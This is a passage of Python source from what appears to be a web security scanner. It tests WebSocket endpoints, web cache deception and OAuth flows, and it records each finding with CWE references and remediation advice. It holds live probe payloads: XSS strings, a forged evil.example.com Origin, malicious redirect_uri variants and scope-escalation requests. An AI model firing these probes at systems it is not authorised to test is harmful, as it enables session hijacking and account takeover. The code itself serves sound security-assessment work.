            return int(raw.split(b"\r\n")[0].split()[1])
        except (IndexError, ValueError):
            return 0

    def _ws_handshake(path, origin=None, cookies=None, extra_headers=None):
        """Build a WebSocket upgrade request."""
        ws_key = _b64ws.b64encode(os.urandom(16)).decode()
        lines = [
            f"GET {path} HTTP/1.1",
            f"Host: {hostname}:{port}" if port not in (80, 443) else f"Host: {hostname}",
            "Upgrade: websocket",
            "Connection: Upgrade",
            f"Sec-WebSocket-Key: {ws_key}",
            "Sec-WebSocket-Version: 13",
        ]
        if origin:
            lines.append(f"Origin: {origin}")
        else:
            lines.append(f"Origin: {scheme}://{hostname}")
        if cookies:
            lines.append(f"Cookie: {cookies}")
        if extra_headers:
            for k, v in extra_headers.items():
                lines.append(f"{k}: {v}")
        lines.append("")
        lines.append("")
        return ("\r\n".join(lines)).encode(), ws_key

    def _ws_send_text(sock, msg):
        """Send a masked WebSocket text frame."""
        payload = msg.encode("utf-8")
        mask_key = os.urandom(4)
        masked = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
        frame = bytearray()
        frame.append(0x81)  # FIN + text opcode
        plen = len(payload)
        if plen < 126:
            frame.append(0x80 | plen)  # masked
        elif plen < 65536:
            frame.append(0x80 | 126)
            frame.extend(_struct_ws.pack("!H", plen))
        else:
            frame.append(0x80 | 127)
            frame.extend(_struct_ws.pack("!Q", plen))
        frame.extend(mask_key)
        frame.extend(masked)
        sock.sendall(bytes(frame))

    def _ws_read_frame(sock, max_wait=3.0):
        """Read a single WebSocket frame, return decoded text or None."""
        deadline = time.time() + max_wait
        buf = b""
        while time.time() < deadline:
            rem = max(deadline - time.time(), 0.05)
            ready = _sel2.select([sock], [], [], min(rem, 0.5))
            if not ready[0]:
                if buf:
                    break
                continue
            try:
                chunk = sock.recv(8192)
            except (_sock.error, _ssl2.SSLError, OSError):
                break
            if not chunk:
                break
            buf += chunk
            if len(buf) >= 2:
                break
        if len(buf) < 2:
            return None
        try:
            opcode = buf[0] & 0x0F
            masked = bool(buf[1] & 0x80)
            plen = buf[1] & 0x7F
            offset = 2
            if plen == 126:
                if len(buf) < 4:
                    return None
                plen = _struct_ws.unpack("!H", buf[2:4])[0]
                offset = 4
            elif plen == 127:
                if len(buf) < 10:
                    return None
                plen = _struct_ws.unpack("!Q", buf[2:10])[0]
                offset = 10
            if masked:
                mask = buf[offset:offset + 4]
                offset += 4
                data = bytes(b ^ mask[i % 4] for i, b in enumerate(buf[offset:offset + plen]))
            else:
                data = buf[offset:offset + plen]
            if opcode == 1:  # text
                return data.decode("utf-8", errors="replace")
            return data.hex()[:200]
        except Exception:
            return None

    # ── Step 1: Discovery ─────────────────────────────────────────────────

    _ws_paths = ["/ws", "/websocket", "/socket.io/", "/signalr/",
                 "/signalr/negotiate", "/hub", "/cable",
                 "/graphql", "/subscriptions"]
    # Extract WS endpoints from JS/HTML in crawl_data
    _ws_from_js: list = []
    for lnk in crawl_data.get("links", []):
        if lnk.endswith(".js"):
            try:
                r = sess.get(lnk, timeout=timeout)
                if r and r.status_code == 200:
                    for m in re.finditer(r"""(?:new\s+WebSocket|ws[s]?://)(["'`])([^"'`\s]{5,200})\1""", r.text):
                        _ws_from_js.append(m.group(2))
                    for m in re.finditer(r"""ws[s]?://[^\s"'`<>]{5,200}""", r.text):
                        _ws_from_js.append(m.group(0))
            except Exception:
                pass
    # Also scan the base page HTML
    try:
        _base_r = sess.get(url, timeout=timeout)
        if _base_r and _base_r.status_code == 200:
            for m in re.finditer(r"""ws[s]?://[^\s"'`<>]{5,200}""", _base_r.text):
                _ws_from_js.append(m.group(0))
    except Exception:
        pass

    # Deduplicate and extract paths from full WS URLs
    for ws_url in _ws_from_js:
        try:
            if ws_url.startswith("ws://") or ws_url.startswith("wss://"):
                parsed = urllib.parse.urlparse(ws_url)
                if parsed.hostname == hostname and parsed.path and parsed.path not in _ws_paths:
                    _ws_paths.append(parsed.path)
            elif ws_url.startswith("/") and ws_url not in _ws_paths:
                _ws_paths.append(ws_url)
        except Exception:
            pass

    _cookies = "; ".join(f"{c.name}={c.value}" for c in sess.cookies)
    _discovered_ws: list = []  # list of {"path": str, "status": int}

    for ws_path in _ws_paths:
        try:
            sock = _ws_connect(hostname, port, use_tls)
            req, _key = _ws_handshake(ws_path, cookies=_cookies)
            sock.sendall(req)
            resp = _ws_recv(sock, max_wait=timeout)
            code = _ws_status(resp)
            _ws_close(sock)
            if code == 101:
                _discovered_ws.append({"path": ws_path, "status": code})
                vc.log(f"[websocket] Discovered WS endpoint: {ws_path} (101)", "SUCCESS")
            elif code in (200, 400, 426):
                # 400/426 = upgrade required or version mismatch — endpoint exists
                _discovered_ws.append({"path": ws_path, "status": code})
                vc.log(f"[websocket] Potential WS endpoint: {ws_path} ({code})", "INFO")
        except Exception:
            pass

    if not _discovered_ws:
        vc.status(phase, "WebSocket Testing", "complete", "No WS endpoints found", 4, 4)
        vc.log("[websocket] No WebSocket endpoints discovered — phase complete", "INFO")
        return

    vc.log(f"[websocket] Discovered {len(_discovered_ws)} WS endpoint(s)", "SUCCESS")

    # ── Step 2: Auth check ────────────────────────────────────────────────
    vc.status(phase, "WebSocket Testing", "running", "Auth check", 1, 4)

    for ep in _discovered_ws:
        if ep["status"] != 101:
            continue
        try:
            sock = _ws_connect(hostname, port, use_tls)
            # Send without cookies
            req, _key = _ws_handshake(ep["path"], cookies=None)
            sock.sendall(req)
            resp = _ws_recv(sock, max_wait=timeout)
            code = _ws_status(resp)
            _ws_close(sock)
            if code == 101:
                _ev_content = (
                    f"WebSocket upgrade to {ep['path']} succeeded without authentication.\n\n"
                    f"Request (no cookies):\n{req.decode('utf-8', errors='replace')}\n\n"
                    f"Response:\n{resp.decode('utf-8', errors='replace')[:2000]}"
                )
                _ev_path = ""
                try:
                    d = out.root / phase
                    d.mkdir(parents=True, exist_ok=True)
                    _safe_ep = re.sub(r'[^a-zA-Z0-9_]', '_', ep['path'])[:40]
                    fp = d / f"ws_noauth_{_safe_ep}.txt"
                    fp.write_text(_ev_content)
                    _ev_path = str(fp.relative_to(out.root))
                except Exception:
                    pass
                out.add_finding(
                    title="WebSocket Endpoint Missing Authentication",
                    url=f"{scheme}://{hostname}:{port}{ep['path']}",
                    port=target["port"], risk="HIGH",
                    description=(
                        f"The WebSocket endpoint at {ep['path']} accepted an upgrade "
                        f"request without any authentication cookies or tokens. An attacker "
                        f"can connect directly and interact with the WebSocket API without "
                        f"authenticating."
                    ),
                    output=f"Path: {ep['path']}\nUpgrade without cookies: HTTP 101 (success)",
                    output_file=_ev_path,
                    sources="fracture-websocket", service=target["scheme"],
                    affected=_clean_url(scheme, hostname, port, ep['path']),
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="IA-9",
                    cvss_score=7.5,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                    cwe=["CWE-306"],
                    remediation=(
                        "Require authentication for WebSocket upgrade requests. Validate "
                        "session tokens or auth headers before accepting the connection."
                    ),
                )
                vc.log(f"[websocket] No auth required for {ep['path']}", "SUCCESS")
        except Exception:
            pass

    # ── Step 3: Origin validation ─────────────────────────────────────────
    vc.status(phase, "WebSocket Testing", "running", "Origin validation", 2, 4)

    for ep in _discovered_ws:
        if ep["status"] != 101:
            continue
        try:
            sock = _ws_connect(hostname, port, use_tls)
            req, _key = _ws_handshake(ep["path"],
                                       origin="https://evil.example.com",
                                       cookies=_cookies)
            sock.sendall(req)
            resp = _ws_recv(sock, max_wait=timeout)
            code = _ws_status(resp)
            _ws_close(sock)
            if code == 101:
                _ev_content = (
                    f"WebSocket upgrade to {ep['path']} succeeded with evil origin.\n\n"
                    f"Request:\n{req.decode('utf-8', errors='replace')}\n\n"
                    f"Response:\n{resp.decode('utf-8', errors='replace')[:2000]}"
                )
                _ev_path = ""
                try:
                    d = out.root / phase
                    d.mkdir(parents=True, exist_ok=True)
                    _safe_ep = re.sub(r'[^a-zA-Z0-9_]', '_', ep['path'])[:40]
                    fp = d / f"ws_origin_{_safe_ep}.txt"
                    fp.write_text(_ev_content)
                    _ev_path = str(fp.relative_to(out.root))
                except Exception:
                    pass
                out.add_finding(
                    title="WebSocket Missing Origin Validation",
                    url=f"{scheme}://{hostname}:{port}{ep['path']}",
                    port=target["port"], risk="MEDIUM",
                    description=(
                        f"The WebSocket endpoint at {ep['path']} accepted a connection "
                        f"with Origin: https://evil.example.com. This allows cross-site "
                        f"WebSocket hijacking (CSWSH) — a malicious page can open a WS "
                        f"connection to the target and interact with the user's session."
                    ),
                    output=f"Path: {ep['path']}\nOrigin: https://evil.example.com\nResult: HTTP 101",
                    output_file=_ev_path,
                    sources="fracture-websocket", service=target["scheme"],
                    affected=_clean_url(scheme, hostname, port, ep['path']),
                    owasp="A01:2025 Broken Access Control",
                    nist="SC-23",
                    cvss_score=5.3,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                    cwe=["CWE-1385", "CWE-346"],
                    remediation=(
                        "Validate the Origin header on WebSocket upgrade requests. Reject "
                        "connections from untrusted origins. This is the WebSocket equivalent "
                        "of CSRF protection."
                    ),
                )
                vc.log(f"[websocket] Origin bypass on {ep['path']}", "SUCCESS")
        except Exception:
            pass

    # ── Step 4: Message injection ─────────────────────────────────────────
    vc.status(phase, "WebSocket Testing", "running", "Message injection", 3, 4)

    _ws_test_messages = [
        ('{"type":"ping"}', "ping"),
        ('<script>alert("fracture_ws_xss")</script>', "xss"),
        ('{"admin":true,"role":"administrator"}', "privesc"),
        ('<img src=x onerror=alert(1)>', "xss_img"),
    ]

    for ep in _discovered_ws:
        if ep["status"] != 101:
            continue
        try:
            sock = _ws_connect(hostname, port, use_tls)
            req, _key = _ws_handshake(ep["path"], cookies=_cookies)
            sock.sendall(req)
            resp = _ws_recv(sock, max_wait=timeout)
            code = _ws_status(resp)
            if code != 101:
                _ws_close(sock)
                continue

            for msg, msg_type in _ws_test_messages:
                try:
                    _ws_send_text(sock, msg)
                    frame_resp = _ws_read_frame(sock, max_wait=3.0)
                    if frame_resp is None:
                        continue
                    # Check for XSS reflection
                    if msg_type in ("xss", "xss_img") and (
                        "fracture_ws_xss" in frame_resp
                        or "<script>" in frame_resp
                        or "onerror=" in frame_resp
                    ):
                        _ev_content = (
                            f"WebSocket at {ep['path']} reflected XSS payload.\n\n"
                            f"Sent: {msg}\nReceived: {frame_resp[:1000]}"
                        )
                        _ev_path = ""
                        try:
                            d = out.root / phase
                            d.mkdir(parents=True, exist_ok=True)
                            _safe_ep = re.sub(r'[^a-zA-Z0-9_]', '_', ep['path'])[:40]
                            fp = d / f"ws_xss_{_safe_ep}.txt"
                            fp.write_text(_ev_content)
                            _ev_path = str(fp.relative_to(out.root))
                        except Exception:
                            pass
                        out.add_finding(
                            title="WebSocket Message Injection (XSS)",
                            url=f"{scheme}://{hostname}:{port}{ep['path']}",
                            port=target["port"], risk="HIGH",
                            description=(
                                f"The WebSocket endpoint at {ep['path']} reflected an XSS "
                                f"payload back in its response frame. If this message is "
                                f"rendered in a browser DOM by the client application, it "
                                f"enables cross-site scripting."
                            ),
                            output=f"Path: {ep['path']}\nSent: {msg}\nReceived: {frame_resp[:500]}",
                            output_file=_ev_path,
                            sources="fracture-websocket", service=target["scheme"],
                            affected=_clean_url(scheme, hostname, port, ep['path']),
                            owasp="A03:2025 Injection",
                            nist="SI-10",
                            cvss_score=7.1,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L",
                            cwe=["CWE-79"],
                            remediation=(
                                "Sanitize all WebSocket message content before processing or "
                                "rendering. Apply the same input validation and output encoding "
                                "rules as for HTTP request parameters."
                            ),
                        )
                        vc.log(f"[websocket] XSS reflected on {ep['path']}", "SUCCESS")
                        break  # One XSS finding per endpoint is enough
                except Exception:
                    pass

            _ws_close(sock)
        except Exception:
            pass

    vc.status(phase, "WebSocket Testing", "complete", "Done", 4, 4)
    vc.log("[websocket] Phase complete", "SUCCESS")


# =============================================================================
# Test: Web Cache Deception
# =============================================================================
# CWE-525: Use of Web Browser Cache Containing Sensitive Information

def _test_web_cache_deception(target: dict, cfg: dict, out: OutputManager,
                              sess: requests.Session) -> None:
    """Test for web cache deception vulnerabilities.

    Appends static-looking extensions to authenticated URLs to check if
    reverse proxies / CDNs cache the response and serve it to others.
    """
    phase   = "web_cache_deception"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)

    vc.status(phase, "Cache Deception", "running", "Testing", 0, 2)

    # Build a list of URLs to test — the base authenticated URL plus any
    # known authenticated paths (from session landing or cfg)
    _test_urls = [url.rstrip("/")]
    _auth_cfg = cfg.get("auth", {})
    _landing = _auth_cfg.get("landing_url", "")
    if _landing and _landing.rstrip("/") != _test_urls[0]:
        _test_urls.append(_landing.rstrip("/"))

    _cache_suffixes = [
        "/nonexistent.css",
        "/nonexistent.js",
        "/nonexistent.jpg",
        "/nonexistent.ico",
        "/nonexistent.woff2",
        ";/style.css",                 # path parameter injection
        "%2Fstatic.css",               # encoded path confusion
        "/..%2Fstatic%2Fstyle.css",    # dot-segment path confusion
    ]

    _cache_hit_indicators = re.compile(
        r"x-cache:\s*hit|x-cache-hits:\s*[1-9]|cf-cache-status:\s*hit|"
        r"x-varnish-cache:\s*hit|x-proxy-cache:\s*hit|"
        r"age:\s*[1-9]",
        re.IGNORECASE,
    )

    _authenticated_markers = re.compile(
        r"(?:logout|sign.?out|my.?account|my.?profile|dashboard|welcome.back|"
        r"logged.in.as|user.?name|email.*@|session|csrf.token|__RequestVerification)",
        re.IGNORECASE,
    )

    _found: set = set()

    for base_url in _test_urls:
        # Get baseline authenticated response
        try:
            _bl = sess.get(base_url, timeout=timeout, allow_redirects=True)
        except Exception:
            continue
        if not _bl or _bl.status_code != 200:
            continue
        _bl_has_auth = bool(_authenticated_markers.search(_bl.text[:5000]))
        if not _bl_has_auth:
            continue  # Page doesn't look authenticated — skip

        for suffix in _cache_suffixes:
            deception_url = base_url + suffix
            if deception_url in _found:
                continue
            try:
                # First request — prime the cache with authenticated content
                r1 = sess.get(deception_url, timeout=timeout, allow_redirects=False)
                if not r1 or r1.status_code not in (200, 301, 302):
                    continue

                # Check Cache-Control
                _cc = r1.headers.get("Cache-Control", "").lower()
                _is_public = "public" in _cc or (
                    "private" not in _cc and "no-cache" not in _cc and "no-store" not in _cc
                )

                # Check for cache hit headers
                _headers_str = "\n".join(f"{k}: {v}" for k, v in r1.headers.items())
                _has_cache_hit = bool(_cache_hit_indicators.search(_headers_str))

                # Check if response body contains authenticated content
                _body_has_auth = bool(_authenticated_markers.search(r1.text[:5000]))

                if r1.status_code == 200 and _body_has_auth and (_is_public or _has_cache_hit):
                    # Potential cache deception — now verify by requesting
                    # the same URL without auth cookies
                    _unauth_sess = requests.Session()
                    _unauth_sess.verify = cfg.get("verify_ssl", False)
                    _unauth_sess.headers.update({"User-Agent": sess.headers.get("User-Agent", "")})
                    try:
                        r2 = _unauth_sess.get(deception_url, timeout=timeout,
                                              allow_redirects=False)
                        _r2_has_auth = bool(
                            r2 and r2.status_code == 200
                            and _authenticated_markers.search(r2.text[:5000])
                        )
                    except Exception:
                        _r2_has_auth = False

                    _severity = "HIGH" if _r2_has_auth else "MEDIUM"
                    _confirmed = " (CONFIRMED)" if _r2_has_auth else " (potential)"
                    _found.add(deception_url)

                    _rq, _rp = _save_http_evidence(
                        out, phase, f"cache_deception_{suffix.replace('/', '_')[:30]}", r1,
                    )
                    out.add_finding(
                        title=f"Web Cache Deception{_confirmed}",
                        url=deception_url, port=target["port"], risk=_severity,
                        description=(
                            f"The server returned authenticated page content when the URL "
                            f"'{deception_url}' was requested. The response Cache-Control "
                            f"header ({_cc or 'absent'}) does not prevent caching, and "
                            f"{'cache-hit headers were present' if _has_cache_hit else 'the response may be cached by intermediaries'}. "
                            + (f"An unauthenticated request to the same URL returned the "
                               f"cached authenticated content, confirming the vulnerability."
                               if _r2_has_auth else
                               f"An unauthenticated request did not return cached content, "
                               f"but the conditions for cache deception exist.")
                        ),
                        output=(
                            f"URL: {deception_url}\n"
                            f"Auth response: HTTP {r1.status_code}, {len(r1.text)} bytes\n"
                            f"Cache-Control: {_cc or '(none)'}\n"
                            f"Cache headers: {_headers_str[:300]}\n"
                            f"Auth content present: {_body_has_auth}\n"
                            + (f"Unauth response: HTTP {r2.status_code}, auth content: {_r2_has_auth}"
                               if _r2_has_auth else "")
                        ),
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-cache-deception", service=target["scheme"],
                        affected=deception_url,
                        owasp="A05:2025 Security Misconfiguration",
                        nist="SC-28",
                        remediation=(
                            "Configure the reverse proxy or CDN to never cache responses "
                            "that contain session cookies or authenticated content. Set "
                            "'Cache-Control: no-store, private' on all authenticated pages. "
                            "Reject or 404 requests with unexpected file extensions appended "
                            "to application paths."
                        ),
                        cvss_score=7.5,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                        cwe=["CWE-525"],
                    )
                    vc.log(f"[cache_deception] Cache deception{_confirmed}: {suffix}", "SUCCESS")
                    break  # One finding per base URL is enough
            except Exception:
                pass

    vc.status(phase, "Cache Deception", "complete", "Done", 2, 2)
    vc.log("[web_cache_deception] Test complete", "SUCCESS")


# =============================================================================
# Test: OAuth / OIDC / SAML Flow Vulnerabilities
# =============================================================================
# CWE-601: URL Redirection to Untrusted Site (redirect_uri)
# CWE-352: CSRF (missing state)
# CWE-200: Exposure of Sensitive Information (token leakage)

def _test_oauth_flows(target: dict, cfg: dict, out: OutputManager,
                      sess: requests.Session, crawl_data: dict) -> None:
    """Test OAuth/OIDC/SAML flow vulnerabilities.

    Discovers OAuth endpoints, tests redirect_uri manipulation, missing state
    parameter, token leakage via URL, and scope escalation.
    """
    phase   = "oauth_flows"
    url     = target["url"]
    hostname = target["hostname"]
    timeout = cfg.get("timeout", 10)
    scheme  = target["scheme"]

    vc.status(phase, "OAuth Flow Testing", "running", "Discovery", 0, 5)

    # ── Step 1: Discover OAuth endpoints ──────────────────────────────────

    _oidc_urls = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/oauth/authorize",
        "/oauth2/authorize",
        "/connect/authorize",
        "/auth/realms/master/.well-known/openid-configuration",  # Keycloak
        "/adfs/.well-known/openid-configuration",                # ADFS
        "/v2.0/.well-known/openid-configuration",                # Azure AD
    ]

    _oauth_config: dict = {}
    _authorize_url = ""
    _token_url = ""
    _redirect_uris_found: list = []
    _scope_found = ""
    _client_id_found = ""

    # Check well-known endpoints
    base = f"{scheme}://{hostname}" if target["port"] in (80, 443) else f"{scheme}://{hostname}:{target['port']}"
    for oidc_path in _oidc_urls:
        try:
            r = sess.get(base + oidc_path, timeout=timeout, allow_redirects=False)
            if r and r.status_code == 200:
                try:
                    _oauth_config = r.json()
                    _authorize_url = _oauth_config.get("authorization_endpoint", "")
                    _token_url = _oauth_config.get("token_endpoint", "")
                    vc.log(f"[oauth] OpenID config found at {oidc_path}", "SUCCESS")
                    break
                except Exception:
                    pass
        except Exception:
            pass

    # Scan crawl data for OAuth patterns
    _oauth_re = re.compile(
        r"(?:authorize\?|client_id=|redirect_uri=|response_type=|scope=|"
        r"oauth|openid|/auth/|/login/oauth|/sso/)",
        re.IGNORECASE,
    )

    for link in crawl_data.get("links", []):
        if _oauth_re.search(link):
            parsed = urllib.parse.urlparse(link)
            qs = urllib.parse.parse_qs(parsed.query)
            if "redirect_uri" in qs:
                _redirect_uris_found.extend(qs["redirect_uri"])
            if "client_id" in qs and not _client_id_found:
                _client_id_found = qs["client_id"][0]
            if "scope" in qs and not _scope_found:
                _scope_found = qs["scope"][0]
            if not _authorize_url and "authorize" in link.lower():
                _authorize_url = link.split("?")[0]

    # Also scan JS content for OAuth patterns
    for lnk in crawl_data.get("links", [])[:15]:
        if not lnk.endswith(".js"):
            continue
        try:
            r = sess.get(lnk, timeout=timeout)
            if r and r.status_code == 200:
                # Find client_id
                for m in re.finditer(r'client_id["\s:=]+["\']([a-zA-Z0-9_-]{8,})["\']', r.text):
                    if not _client_id_found:
                        _client_id_found = m.group(1)
                # Find redirect_uri
                for m in re.finditer(r'redirect_uri["\s:=]+["\'](https?://[^\s"\']+)["\']', r.text):
                    _redirect_uris_found.append(m.group(1))
                # Find authorize URL
                if not _authorize_url:
                    for m in re.finditer(r'(https?://[^\s"\']+/(?:oauth2?|connect)/authorize)', r.text):
                        _authorize_url = m.group(1)
                # Find scope
                if not _scope_found:
                    for m in re.finditer(r'scope["\s:=]+["\']([\w\s.]+)["\']', r.text):
                        _scope_found = m.group(1)
        except Exception:
            pass

    if not _authorize_url and not _oauth_config and not _redirect_uris_found:
        vc.status(phase, "OAuth Flow Testing", "complete", "No OAuth endpoints found", 5, 5)
        vc.log("[oauth] No OAuth/OIDC endpoints discovered — skipping", "INFO")
        return

    vc.log(f"[oauth] authorize={_authorize_url or '(unknown)'}, "
           f"client_id={_client_id_found or '(unknown)'}, "
           f"redirect_uris={len(_redirect_uris_found)}", "INFO")

    # ── Step 2: redirect_uri manipulation ─────────────────────────────────
    vc.status(phase, "OAuth Flow Testing", "running", "redirect_uri testing", 1, 5)

    if _authorize_url and _client_id_found:
        _evil_redirects = [
            ("https://evil.example.com/callback", "external domain"),
            (f"{scheme}://{hostname}@evil.example.com/callback", "URL confusion (@)"),
            (f"{scheme}://{hostname}.evil.example.com/callback", "subdomain append"),
            (f"{scheme}://{hostname}%00.evil.example.com/callback", "null byte"),
            (f"{scheme}://{hostname}/callback/../../../evil", "path traversal"),
        ]

        for evil_uri, desc in _evil_redirects:
            try:
                _auth_params = {
                    "client_id": _client_id_found,
                    "redirect_uri": evil_uri,
                    "response_type": "code",
                    "scope": _scope_found or "openid",
                }
                r = sess.get(_authorize_url, params=_auth_params, timeout=timeout,
                             allow_redirects=False)
                if not r:
                    continue
                # Check if the server accepted the evil redirect_uri
                loc = r.headers.get("Location", "")
                if r.status_code in (301, 302, 303, 307, 308):
                    # If it redirects to the evil URI, it's vulnerable
                    if "evil.example.com" in loc or evil_uri in loc:
                        _rq, _rp = _save_http_evidence(out, phase,
                                                        f"oauth_redir_{desc.replace(' ', '_')[:20]}", r)
                        out.add_finding(
                            title=f"OAuth redirect_uri Open Redirect — {desc}",
                            url=_authorize_url, port=target["port"], risk="HIGH",
                            description=(
                                f"The OAuth authorization endpoint accepted a manipulated "
                                f"redirect_uri ({evil_uri}). The server redirected to this "
                                f"URL, which would expose the authorization code to an "
                                f"attacker-controlled domain."
                            ),
                            output=(
                                f"Authorization URL: {_authorize_url}\n"
                                f"Evil redirect_uri: {evil_uri}\n"
                                f"Response: HTTP {r.status_code}\n"
                                f"Location: {loc[:500]}"
                            ),
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-oauth", service=target["scheme"],
                            affected=_authorize_url,
                            owasp="A07:2025 Identification and Authentication Failures",
                            nist="IA-8",
                            cvss_score=7.4,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:N",
                            cwe=["CWE-601"],
                            remediation=(
                                "Implement strict redirect_uri validation. Use exact-match "
                                "comparison against pre-registered redirect URIs. Do not "
                                "allow wildcards, path traversal, or URL manipulation."
                            ),
                        )
                        vc.log(f"[oauth] redirect_uri bypass: {desc}", "SUCCESS")
                        break
                elif r.status_code == 200 and "evil.example.com" not in r.text:
                    # Server showed a consent/error page — redirect_uri validation
                    # is working (or the error is about something else)
                    pass
            except Exception:
                pass

    # ── Step 3: Missing state parameter ───────────────────────────────────
    vc.status(phase, "OAuth Flow Testing", "running", "State parameter check", 2, 5)

    if _authorize_url and _client_id_found:
        _redir = _redirect_uris_found[0] if _redirect_uris_found else f"{url}/callback"
        try:
            _no_state_params = {
                "client_id": _client_id_found,
                "redirect_uri": _redir,
                "response_type": "code",
                "scope": _scope_found or "openid",
                # Deliberately omit state parameter
            }
            r = sess.get(_authorize_url, params=_no_state_params, timeout=timeout,
                         allow_redirects=False)
            if r and r.status_code in (200, 301, 302, 303, 307, 308):
                loc = r.headers.get("Location", "")
                # If the server redirected without requiring state, it's vulnerable
                _proceeds = (
                    r.status_code in (301, 302, 303, 307, 308)
                    and "error" not in loc.lower()
                    and "invalid" not in loc.lower()
                )
                # Or if it showed a consent page (200) without error about missing state
                if not _proceeds and r.status_code == 200:
                    _proceeds = (
                        "consent" in r.text.lower()
                        or "authorize" in r.text.lower()
                        or "allow" in r.text.lower()
                    ) and "state" not in r.text.lower()[:500]

                if _proceeds:
                    _rq, _rp = _save_http_evidence(out, phase, "oauth_no_state", r)
                    out.add_finding(
                        title="OAuth Missing State Parameter (CSRF)",
                        url=_authorize_url, port=target["port"], risk="MEDIUM",
                        description=(
                            f"The OAuth authorization endpoint processed a request without "
                            f"the 'state' parameter. The state parameter prevents CSRF attacks "
                            f"on the OAuth flow — without it, an attacker can initiate an "
                            f"authorization flow and trick a victim into linking their account "
                            f"to the attacker's."
                        ),
                        output=(
                            f"Authorization URL: {_authorize_url}\n"
                            f"Request without state: {_no_state_params}\n"
                            f"Response: HTTP {r.status_code}\n"
                            f"Location: {loc[:300]}"
                        ),
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-oauth", service=target["scheme"],
                        affected=_authorize_url,
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="IA-8",
                        cvss_score=5.3,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                        cwe=["CWE-352"],
                        remediation=(
                            "Always require and validate the 'state' parameter in OAuth "
                            "authorization requests. Generate a cryptographically random "
                            "state value tied to the user's session and verify it in the "
                            "callback."
                        ),
                    )
                    vc.log("[oauth] State parameter not required — CSRF possible", "SUCCESS")
        except Exception:
            pass

    # ── Step 4: Token leakage via URL ─────────────────────────────────────
    vc.status(phase, "OAuth Flow Testing", "running", "Token leakage check", 3, 5)

    # Check if the authorization endpoint uses response_type=token (implicit flow)
    if _authorize_url and _client_id_found:
        _redir = _redirect_uris_found[0] if _redirect_uris_found else f"{url}/callback"
        try:
            _token_params = {
                "client_id": _client_id_found,
                "redirect_uri": _redir,
                "response_type": "token",
                "scope": _scope_found or "openid",
                "state": "fracture_test",
            }
            r = sess.get(_authorize_url, params=_token_params, timeout=timeout,
                         allow_redirects=False)
            if r and r.status_code in (301, 302, 303, 307, 308):
                loc = r.headers.get("Location", "")
                # Implicit flow puts token in fragment (#access_token=...)
                if "access_token=" in loc or "token=" in loc:
                    _rq, _rp = _save_http_evidence(out, phase, "oauth_token_leak", r)
                    out.add_finding(
                        title="Information Disclosure: OAuth Token via URL",
                        url=_authorize_url, port=target["port"], risk="HIGH",
                        description=(
                            f"The OAuth endpoint supports the implicit flow "
                            f"(response_type=token), which returns access tokens directly "
                            f"in the URL fragment. Tokens in URLs are logged in browser "
                            f"history, server logs, and can leak via the Referer header. "
                            f"The implicit flow is deprecated in OAuth 2.1."
                        ),
                        output=(
                            f"Authorization URL: {_authorize_url}\n"
                            f"response_type: token\n"
                            f"Location header contains token: {loc[:300]}"
                        ),
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-oauth", service=target["scheme"],
                        affected=_authorize_url,
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="SC-12",
                        cvss_score=7.5,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                        cwe=["CWE-200", "CWE-598"],
                        remediation=(
                            "Disable the implicit flow (response_type=token). Use the "
                            "authorization code flow with PKCE instead. OAuth 2.1 formally "
                            "deprecates the implicit grant."
                        ),
                    )
                    vc.log("[oauth] Implicit flow enabled — token in URL", "SUCCESS")
        except Exception:
            pass

    # ── Step 5: Scope escalation ──────────────────────────────────────────
    vc.status(phase, "OAuth Flow Testing", "running", "Scope escalation", 4, 5)

    if _authorize_url and _client_id_found and _scope_found:
        _redir = _redirect_uris_found[0] if _redirect_uris_found else f"{url}/callback"
        _escalated_scopes = [
            (_scope_found + " admin", "admin"),
            ("openid profile email offline_access", "offline_access"),
            (_scope_found + " write", "write"),
            (_scope_found + " user:admin", "user:admin"),
        ]
        for escalated_scope, scope_desc in _escalated_scopes:
            if escalated_scope.strip() == _scope_found.strip():
                continue
            try:
                _esc_params = {
                    "client_id": _client_id_found,
                    "redirect_uri": _redir,
                    "response_type": "code",
                    "scope": escalated_scope,
                    "state": "fracture_test",
                }
                r = sess.get(_authorize_url, params=_esc_params, timeout=timeout,
                             allow_redirects=False)
                if not r:
                    continue
                loc = r.headers.get("Location", "")
                # If it redirects with a code (no error), the scope may have been accepted
                if r.status_code in (301, 302, 303, 307, 308):
                    if "code=" in loc and "error" not in loc.lower():
                        _rq, _rp = _save_http_evidence(
                            out, phase, f"oauth_scope_{scope_desc}", r)
                        out.add_finding(
                            title=f"OAuth Scope Escalation — {scope_desc}",
                            url=_authorize_url, port=target["port"], risk="HIGH",
                            description=(
                                f"The OAuth authorization endpoint accepted an escalated "
                                f"scope '{escalated_scope}' beyond the application's "
                                f"original scope '{_scope_found}'. This may grant elevated "
                                f"privileges to the access token."
                            ),
                            output=(
                                f"Authorization URL: {_authorize_url}\n"
                                f"Original scope: {_scope_found}\n"
                                f"Escalated scope: {escalated_scope}\n"
                                f"Response: HTTP {r.status_code}\n"
                                f"Location: {loc[:300]}"
                            ),
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-oauth", service=target["scheme"],
                            affected=_authorize_url,
                            owasp="A01:2025 Broken Access Control",
                            nist="AC-6",
                            cvss_score=8.1,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                            cwe=["CWE-269"],
                            remediation=(
